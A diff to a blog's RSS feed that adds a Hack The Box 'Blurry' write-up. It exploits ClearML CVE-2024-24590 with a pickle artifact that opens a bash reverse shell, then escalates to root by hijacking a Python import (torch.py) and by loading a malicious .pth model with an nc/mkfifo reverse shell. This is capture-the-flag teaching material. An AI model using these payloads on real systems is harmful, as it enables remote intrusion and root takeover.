@@ -6,8 +6,156 @@
         <generator>Hugo -- gohugo.io</generator>
         <language>en</language>
         <copyright>&lt;a href=&#34;https://creativecommons.org/licenses/by-nc/4.0/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CC BY-NC 4.0&lt;/a&gt;</copyright>
-        <lastBuildDate>Mon, 30 Sep 2024 13:36:12 -0500</lastBuildDate>
+        <lastBuildDate>Thu, 10 Oct 2024 19:31:38 -0500</lastBuildDate>
         <atom:link href="https://scorpiosec.com/posts/index.xml" rel="self" type="application/rss+xml" />
+        
+        <item>
+            <title>HTB: Blurry</title>
+            <link>https://scorpiosec.com/posts/2024/10/htb-blurry/</link>
+            <pubDate>Thu, 10 Oct 2024 19:31:38 -0500</pubDate>
+            
+            <guid>https://scorpiosec.com/posts/2024/10/htb-blurry/</guid>
+            <description>Platform: Hack The Box Link: Blurry Level: Medium OS: Linux The Blurry machine demonstrates how Python modules and specific Python features can be exploited to compromise systems. The challenge begins with access to a ClearML instance, containing various experiments tied to a project. Using CVE-2024-24590, we gain our initial foothold by uploading a malicious artifact through the API, allowing us to retrieve the user flag. This write-up will detail two distinct methods for privilege escalation, showcasing different approaches to fully compromise the system.</description>
+            <content type="html"><![CDATA[<ul>
+<li>Platform: Hack The Box</li>
+<li>Link: <a href="https://app.hackthebox.com/machines/Blurry" target="_blank" >Blurry</a>
+
+</li>
+<li>Level: Medium</li>
+<li>OS: Linux</li>
+</ul>
+<hr>
+<p>The Blurry machine demonstrates how Python modules and specific Python features can be exploited to compromise systems. The challenge begins with access to a ClearML instance, containing various experiments tied to a project. Using <code>CVE-2024-24590</code>, we gain our initial foothold by uploading a malicious artifact through the API, allowing us to retrieve the user flag. This write-up will detail two distinct methods for privilege escalation, showcasing different approaches to fully compromise the system.</p>
+<p>Target IP Address - <code>10.10.11.19</code></p>
+<h2 id="scanning">Scanning</h2>
+<pre tabindex="0"><code>./nmap_scan.sh 10.10.11.19 Blurry
+</code></pre><p><strong>Results</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>Running detailed scan on open ports: 22,80
+</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-10-10 19:38 CDT
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.11.19
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.061s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 <span style="color:#f92672">(</span>protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssh-hostkey: 
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">3072</span> 3e:21:d5:dc:2e:61:eb:8f:a6:3b:24:2a:b7:1c:05:d3 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> 39:11:42:3f:0c:25:00:08:d7:2f:1b:51:e0:43:9d:85 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> b0:6f:a0:0a:9e:df:b1:7a:49:78:86:b2:35:40:ec:95 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>80/tcp open  http    nginx 1.18.0
+</span></span><span style="display:flex;"><span>|_http-server-header: nginx/1.18.0
+</span></span><span style="display:flex;"><span>|_http-title: Did not follow redirect to http://app.blurry.htb/
+</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 12.40 seconds
+</span></span></code></pre></div><p>Our nmap scan discovers two ports 22 (SSH) and 80 (HTTP). We also notice a redirection to <code>app.blurry.htb</code>, which we will access after updating our hosts file.</p>
+<pre tabindex="0"><code>sudo echo &#34;10.10.11.19 blurry.htb app.blurry.htb&#34; | sudo tee -a /etc/hosts
+</code></pre><h2 id="enumeration">Enumeration</h2>
+<p>At <code>http://app.blurry.htb/</code> we find a ClearML instance which we can connect to with the user name <code>Chad Jippity</code>. On the Github page we read that this solution is a &ldquo;ML/DL development and production suite&hellip;&rdquo;. <em><a href="https://github.com/allegroai/clearml" target="_blank" >Source</a>
+
+</em></p>
+<p><img src="/images/HTB-Blurry/ClearML_website.png" alt="ClearML website"></p>
+<p>There is nothing out of the ordinary on the website. Through subdomain enumeration we get two more results <code>files</code>, and <code>chat</code>.</p>
+<pre tabindex="0"><code>ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --fc 404 -t 100 -u http://blurry.htb -H &#34;Host: FUZZ.blurry.htb&#34; -ic -fs 169
+</code></pre><p><img src="/images/HTB-Blurry/blurry_ffuf.png" alt="Blurry subdomain enumeration"></p>
+<p>Since this is an orchestration and automation platform, it is safe to assume that there is some code running here. Upon entering the <code>Black Swan</code> project, we find different tasks or jobs under <code>Experiments</code>.</p>
+<p><img src="/images/HTB-Blurry/blurry_experiments.png" alt="Blurry Experiments section"></p>
+<p>Right-clicking on one of the jobs and selecting <code>Details</code> shows that there is a script powering the tasks (<code>review_tasks.py</code>) in the picture below.</p>
+<p><img src="/images/HTB-Blurry/experiment_details.png" alt="Blurry Experiments details"></p>
+<p>Through some research we discover various vulnerabilities related to ClearML, they are detailed <a href="https://hiddenlayer.com/research/not-so-clear-how-mlops-solutions-can-muddy-the-waters-of-your-supply-chain/" target="_blank" >here</a>
+
+.</p>
+<p>Under the article section <code>Manipulating the Platform to Work for us</code> we get some code to exploit ClearML with <code>CVE-2024-24590</code>. We need to create a malicious artifact and then upload it to the instance for a project under our control.</p>
+<p><img src="/images/HTB-Blurry/malicious_artifact.png" alt="Malicious artifact"></p>
+<p><img src="/images/HTB-Blurry/malicious_artifact_upload.png" alt="Malicious artifact upload"></p>
+<h2 id="initial-foothold">Initial Foothold</h2>
+<p>First we need to connect our local machine to the ClearML server. Under the <code>Black Swan</code> project click on <code>New experiment</code>.</p>
+<p><img src="/images/HTB-Blurry/clearml_new_experiment.png" alt="ClearML new experiment"></p>
+<p>There is a guide on how to set it up. Complete the configuration as prompted.</p>
+<ol>
+<li>Install the <code>clearml</code> python package</li>
+</ol>
+<pre tabindex="0"><code>pip install clearml
+</code></pre><ol start="2">
+<li>Run the command below</li>
+</ol>
+<pre tabindex="0"><code>clearml-init
+</code></pre><ol start="3">
+<li>When prompted with <code>Paste copied configuration here:</code> use the code you generated after clicking on <code>CREATE NEW CREDENTIALS</code>. You need to add <code>api.blurry.htb</code> to your hosts file or the configuration will fail.</li>
+</ol>
+<p><img src="/images/HTB-Blurry/clearml_config_steps.png" alt="ClearML configuartion steps"></p>
+<p>If everything goes right you will be notifiied as such.</p>
+<p><img src="/images/HTB-Blurry/ClearML_success_config.png" alt="ClearML successful configuration"></p>
+<ol start="4">
+<li>We can now upload a malicious artifact in order to get a reverse shell, after running the script below we get a shell on our listener as <code>jippity</code> and find the user flag in <code>/home/jippity</code>.</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> pickle<span style="color:#f92672">,</span> os
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">RunCommand</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">__reduce__</span>(self):
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> (os<span style="color:#f92672">.</span>system, (<span style="color:#e6db74">&#39;/bin/bash -c &#34;/bin/bash -i &gt;&amp; /dev/tcp/IP/PORT 0&gt;&amp;1&#34;&#39;</span>,))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>command <span style="color:#f92672">=</span> RunCommand()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> clearml <span style="color:#f92672">import</span> Task
+</span></span><span style="display:flex;"><span>task <span style="color:#f92672">=</span> Task<span style="color:#f92672">.</span>init(project_name<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;Black Swan&#39;</span>, task_name<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;pickle_artifact_upload&#39;</span>, tags<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;review&#34;</span>])
+</span></span><span style="display:flex;"><span>task<span style="color:#f92672">.</span>upload_artifact(name<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;pickle_artifact&#39;</span>, artifact_object<span style="color:#f92672">=</span>command, retries<span style="color:#f92672">=</span><span style="color:#ae81ff">2</span>, wait_on_upload<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>, extension_name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;.pkl&#34;</span>)
+</span></span></code></pre></div><p><img src="/images/HTB-Blurry/blurry_user_flag.png" alt="Blurry user flag"></p>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<p>With <code>sudo -l</code> we learn that the user <code>jippity</code> has the permission to run the <code>evaluate_model</code> command on any <code>.pth</code> file in the <code>/models</code> directory as root without providing a password.</p>
+<p><img src="/images/HTB-Blurry/sudo-l_cmd.png" alt="Blurry sudo -l"></p>
+<h3 id="python-import-hijacking">Python Import hijacking</h3>
+<p>In <code>/models</code> we find two files <code>demo_model.pth</code>, and <code>evaluate_model.py</code>. The script uses <code>import sys</code> which &ldquo;provides various functions and variables that are used to manipulate different parts of the Python runtime environment.&rdquo;. <em><a href="https://www.geeksforgeeks.org/python-sys-module/" target="_blank" >Source</a>
+
+</em></p>
+<p>Since there is no specifications related to the module we might be able to do some python import hijacking.</p>
+<p><img src="/images/HTB-Blurry/evaluate_model_script.png" alt="evaluate_model script import functions"></p>
+<p>First we create a malicious <code>torch.py</code> script.</p>
+<pre tabindex="0"><code>echo &#39;import os; os.system(&#34;bash&#34;)&#39; &gt; /models/torch.py
+</code></pre><p><img src="/images/HTB-Blurry/malicious_torch_py.png" alt="Malicious torch.py"></p>
+<p>We then run <code>evaluate_model</code> with sudo.</p>
+<pre tabindex="0"><code>sudo /usr/bin/evaluate_model /models/demo_model.pth
+</code></pre><p>A root shell is spawned, allowing us to read the root flag located in <code>/root</code>.</p>
+<p><img src="/images/HTB-Blurry/blurry_root_flag.png" alt="blurry root flag"></p>
+<h4 id="why-is-this-working">Why is this working?</h4>
+<p>When a Python script imports a module (such as <code>torch</code>), Python searches for the module in various locations, starting with the current directory (which is <code>/models</code> in our case). Since we created a file called <code>torch.py</code> in the <code>/models</code> directory, Python imports our malicious <code>torch.py</code> instead of the actual torch library.</p>
+<p>After the import, our file is executed and because the script (<code>evaluate_model.py</code>) is run as sudo we gain a root shell.</p>
+<h3 id="pickle-deserialization">Pickle deserialization</h3>
+<p>We can also exploit the target via pickle deserialization. Let&rsquo;s use a python script to generate a malicious model file.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> torch
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> torch.nn <span style="color:#66d9ef">as</span> nn
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> torch.nn.functional <span style="color:#66d9ef">as</span> F
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> os
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">CustomModel</span>(nn<span style="color:#f92672">.</span>Module):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> __init__(self):
+</span></span><span style="display:flex;"><span>        super(CustomModel, self)<span style="color:#f92672">.</span>__init__()
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>linear <span style="color:#f92672">=</span> nn<span style="color:#f92672">.</span>Linear(<span style="color:#ae81ff">512</span>, <span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">forward</span>(self, x):
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> self<span style="color:#f92672">.</span>linear(x)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">__reduce__</span>(self):
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> (os<span style="color:#f92672">.</span>system, (<span style="color:#e6db74">&#39;echo Going for $USER on $HOSTNAME at $(date);rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc YOUR_IP PORT_NUMBER &gt;/tmp/f&#39;</span>,))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>model <span style="color:#f92672">=</span> CustomModel()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>torch<span style="color:#f92672">.</span>save(model, <span style="color:#e6db74">&#39;root.pth&#39;</span>)
+</span></span></code></pre></div><p>After running the script (<code>root.py</code>) we have a file called <code>root.pth</code>.</p>
+<p><img src="/images/HTB-Blurry/malicious_model_file.png" alt="malicious model file"></p>
+<p>Executing <code>sudo /usr/bin/evaluate_model /models/root.pth</code> grants us a root shell on the listener.</p>
+<p><img src="/images/HTB-Blurry/root_shell.png" alt="root shell"></p>
+<h4 id="why-is-this-working-1">Why is this working?</h4>
+<p>We are able to take advantage of the inherent insecurity of the <code>pickle</code> module. When <code>torch.save</code> is used to save a model in a <code>.pth</code> file, it relies on the <code>pickle</code> module to serialize the object, and the <code>__reduce__</code> method (where we place our malicious command)) dictactes what happens during that process.</p>
+<p><img src="/images/HTB-Blurry/pickle_module.png" alt="pickle module">
+<em><a href="https://docs.python.org/3/library/pickle.html" target="_blank" >Source</a>
+
+</em></p>
+<p>In the <code>CustomModel</code> class, the <code>__reduce__</code> method defines how the object is serialized when saved and how it will be deserialized when loaded. This method also contains our reverse shell command. When <code>torch.save(model, 'root.pth')</code> is called, the model is serialized, and during this process, our <code>__reduce__</code> method tells pickle to store a command that will be executed when the model is deserialized.</p>
+<p>When we run sudo <code>/usr/bin/evaluate_model /models/root.pth</code>, the <code>evaluate_model.py</code> script attempts to load the model using <code>torch.load</code>. This deserializes the model and triggers the <code>__reduce__</code> method in our <code>CustomModel</code> class, which causes Python to execute the malicious command (in this case, the reverse shell).</p>
+<p>I thoroughly enjoyed researching about those exploitation paths, and I was able to learn a lot. Thank you for reading this write up and I hope it was useful to you!</p>
+]]></content>
+        </item>
         
         <item>
             <title>HTB: Freelancer</title>
